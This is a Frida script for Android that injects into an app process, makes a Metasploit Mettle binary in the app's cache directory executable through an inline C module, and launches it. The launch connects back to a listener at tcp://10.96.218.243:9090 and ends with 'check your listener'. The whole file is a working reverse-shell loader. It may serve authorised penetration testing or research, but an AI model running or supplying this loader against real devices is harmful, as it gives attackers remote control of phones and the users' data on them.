rpc.exports = {
  initMettle: function () {
	  Java.perform(function () {
		const pathClassLoader = Java.use('dalvik.system.PathClassLoader');
		const javaFile = Java.use('java.io.File');
		const activityThread = Java.use('android.app.ActivityThread');
        const currentApplication = activityThread.currentApplication();
		const context = currentApplication.getApplicationContext();
		const packageFilesDir = context.getCacheDir().getAbsolutePath().toString();
		const mettle_droid_path = packageFilesDir+"/mettle";
		const mettle_droid_check = javaFile.$new(mettle_droid_path);
		if (!mettle_droid_check.exists()) {
          console.log('Mettle is not available in cachedir at: ' + packageFilesDir);
          console.log('Mettle NOT successfully loaded');
          return;
        }
		var code = "#include <stdio.h>\n";
		code+="#include <stdlib.h>\n";
		code+="#include <gum/guminterceptor.h>\n";
		code+="extern int system (const char * m);\n";
		code+="extern int system (const char * m);\n";
		code+="extern int strlen (const char * m);\n";
		code+="#include <stdio.h>\n";
		code+="int main(int a, int b) { \n";
		code+="system(\"/system/bin/chmod +x "+mettle_droid_path+"\");\n";
		code+="int u = system (\""+mettle_droid_path+" -b 1 -u tcp://10.96.218.243:9090\");\n"
		code+="return u;\n";
		code+="}\n";
		const cm = new CModule(code);
		var mettle_droid = new NativeFunction(cm.main,'int',[]);
		mettle_droid();
		console.log("Mettle successfully launched! check your listener.");	
  })
  }
}